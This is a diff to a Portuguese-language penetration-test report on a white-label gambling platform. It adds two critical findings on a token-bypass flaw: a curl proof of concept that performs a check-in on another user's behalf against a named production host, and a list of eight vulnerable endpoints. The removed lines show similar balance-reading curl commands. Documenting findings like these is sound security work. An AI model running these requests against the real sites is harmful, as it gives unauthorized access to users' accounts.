@@ -36,6 +36,8 @@ Foram identificadas **7 vulnerabilidades** classificadas:
 | F05 | Defesa anti-abuso só na borda CDN                     | 🔵 BAIXA   | Observacional |
 | F06 | Config dump completo sem autenticação                 | 🟠 ALTA    | Confirmado |
 | F07 | F01 replica em múltiplos tenants — bug de plataforma  | 🔴 CRÍTICA | Confirmado |
+| F08 | Token anão executa ações em nome de outros (write)    | 🔴 CRÍTICA | Confirmado |
+| F09 | Escopo do token anão: 8 endpoints afetados            | 🔴 CRÍTICA | Confirmado |
 
 **Achados negativos relevantes (NÃO são vulnerabilidades, mas vale
 documentar pra mostrar onde a defesa está OK):**
@@ -263,28 +265,55 @@ Mover campos sensíveis (ipWhites, taxas, limites) pra
 
 O bug F01 não é restrito ao amizade777. Foi confirmado em
 **rainha777slots** (mesma stack, banco diferente). É bug de **produto**,
-não de instância. Provavelmente afeta todos os tenants white-label
-da plataforma.
+não de instância. Provavelmente afeta todos os tenants white-label.
 
-### Evidência
+---
+
+## F08 — 🔴 CRÍTICO — Token anão executa ações em nome de outros usuários
+
+**Detalhes completos:** `burp_tests/extras/F08_token_anao_write_checkin.md`
+
+### Resumo
+
+O endpoint `/japi/user/api/signIn/v2/signIn` (check-in diário) aceita
+token anão e **executa o check-in em nome do uid passado**. Isso
+escala F01 de "leitura" para "escrita" — o atacante pode interferir
+no programa de fidelidade de outros usuários.
+
+### PoC
 
 ```bash
-# amizade777
-curl -k 'https://ds.amizade777.com/japi/user/balance/querySimpleBalance' -H 'Token: 1'
-→ {"data":{"amount":2447500, ...}}    # R$ 24.475,00
-
-# rainha777slots
-curl -k 'https://ds.rainha777slots.com/japi/user/balance/querySimpleBalance' -H 'Token: 1'
-→ {"data":{"amount":-19997926, ...}}  # R$ -199.979,26 (negativo)
+# Faz check-in pelo usuário 1 sem nenhuma credencial
+curl -k 'https://ds.amizade777.com/japi/user/api/signIn/v2/signIn' \
+  -X POST -H 'Token: 1' -H 'Content-Type: application/json' \
+  -d '{"appPackageName":"com.slots.big","appVersion":"1.0.0"}'
+# → {"code":200,"data":{"reward":0}} (ou 109001 se já fez hoje)
 ```
 
-Saldos diferentes = bancos separados, mas mesmo bug.
+---
 
-### Solução
+## F09 — 🔴 CRÍTICO — Escopo do token anão: 8 endpoints afetados
 
-Reportar ao **fornecedor da plataforma**, não só ao operador do
-amizade. A correção precisa ser distribuída pra todos os tenants em
-uma única release.
+**Detalhes completos:** `burp_tests/extras/F09_token_anao_escopo_amplo.md`
+
+### Resumo
+
+A varredura completa revelou 8 endpoints vulneráveis ao token anão,
+não apenas o `querySimpleBalance`. O bug é sistemático na camada
+de autenticação `japi`.
+
+### Endpoints afetados
+
+| Endpoint | Tipo |
+|----------|------|
+| `/japi/user/balance/querySimpleBalance` | Leitura — saldo |
+| `/japi/user/api/signIn/v2/signIn` | **Escrita** — check-in |
+| `/japi/user/api/signIn/customerSignConfig` | Leitura — VIP + cashback |
+| `/japi/user/getExtraInfo` | Leitura — config |
+| `/japi/user/getDama` | Leitura — dama (apostas) |
+| `/japi/user/vip/getAllDisplayVo` | Leitura — VIP |
+| `/japi/invite/boxConfig/boxReceiveRecord` | Leitura — histórico |
+| `/prod-api/set/mains` | Público |
 
 ---
 
